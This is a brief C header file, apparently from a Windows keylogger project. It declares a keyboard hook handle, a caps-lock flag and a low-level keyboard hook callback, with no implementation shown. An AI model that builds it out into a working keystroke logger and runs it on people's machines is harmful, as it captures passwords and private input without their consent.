#ifndef KEYLOG_H_INCLUDED
#define KEYLOG_H_INCLUDED

extern HHOOK kbdhook;
extern int capsOn;
//char buf[300];

LRESULT CALLBACK LLKeyboardProc(int nCode, WPARAM wp, LPARAM lp);

#endif // KEYLOG_H_INCLUDED
